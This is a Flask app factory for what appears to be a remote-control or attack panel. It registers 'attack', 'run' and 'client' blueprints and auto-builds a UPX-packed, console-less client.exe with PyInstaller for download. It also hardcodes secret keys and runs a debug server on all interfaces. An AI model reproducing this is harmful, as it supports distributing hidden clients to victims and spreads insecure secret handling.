from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_jwt_extended import JWTManager
import os
import subprocess
# init SQLAlchemy
db = SQLAlchemy()


def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = 'sBHRMa-ak48N2wTee7tQuUPqvj_1rGreIPYx6mgjUOA'
    app.config["JWT_SECRET_KEY"] = "sBHRMa-ak48N2wTee7tQuUPqvj_1rGreIPYx6mgjUOA"
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///prod.db'
    app.config['USE_SESSION_FOR_NEXT'] = True

    db.init_app(app)

    jwt = JWTManager(app)

    # Build the client executable if not in downloads
    if not os.path.exists('app/downloads/client.exe'):
        subprocess.run(
            ['pyinstaller',
             '--onefile', 'client/main.py',
             '--distpath', 'downloads',
             '-n', 'client',
             '--noconsole',
             '--upx-dir', 'upx'], cwd='app')

    login_manager = LoginManager()
    login_manager.login_view = 'auth.login'

    login_manager.init_app(app)

    from .models import User

    with app.app_context():
        db.create_all()

    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    from .auth import auth as auth_blueprint
    app.register_blueprint(auth_blueprint)

    from .main import main as main_blueprint
    app.register_blueprint(main_blueprint)

    from .client import client as client_blueprint
    app.register_blueprint(client_blueprint)

    from .attack import attack as attack_blueprint
    app.register_blueprint(attack_blueprint)

    from .run import run as run_blueprint
    app.register_blueprint(run_blueprint)

    return app


if __name__ == '__main__':
    app = create_app()
    app.run(host="0.0.0.0", port=80, debug=True)
